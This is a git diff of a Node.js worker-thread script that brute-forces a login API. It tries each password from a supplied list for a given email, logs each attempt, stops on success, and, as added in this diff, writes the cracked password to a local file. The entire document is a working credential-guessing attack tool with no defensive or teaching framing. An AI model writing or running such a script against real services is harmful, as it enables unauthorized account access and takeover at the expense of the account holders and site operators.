@@ -1,8 +1,12 @@
-import fs from 'fs'
 import chalk from 'chalk'
 import 'dotenv/config'
 import { workerData, parentPort } from 'worker_threads'
 
+import path from 'path'
+import fs from 'fs'
+const fileName='correctPw-BruteForce.txt'
+
+// Get data sent by Worker thread
 const {API_URL,email,passwords,t1} = workerData
 
 
@@ -23,28 +27,21 @@ async function bruteForceAttack(password){
         if(response.ok){
             const t2 = Date.now()
             console.log(chalk.green.bold(`Login Successfully Email:${email} , Password:${password} valid, time: ${(t2-t1)/1000}s`));
+            fs.writeFileSync(path.resolve(fileName),password,'utf-8')
             process.exit(0)
         }
-        // if response !== OK then return false with incorrect password
+        
         console.log(chalk.red(`Login Failed, Password ${password} invalid`));
-        return false
+        return 
     } catch (error) {
         console.log(chalk.red(`Login Failed, Password ${password} invalid, Error: ${error.message}`));
-        return false
+        return 
     }
 }
 
-async function main(){
-    try {
-        // get array of passwords from file password.txt
-        for(let password of passwords){
-            // if password is valid then stop the Loop
-            await bruteForceAttack(password)
-        }
-    } catch (error) {
-        // failed to read the file
-        console.log(chalk.red('Error ',error.message));
-        process.exit(0)
+async function main(){     
+    for(let password of passwords){
+        await bruteForceAttack(password)
     }
     parentPort.postMessage('done')
 }
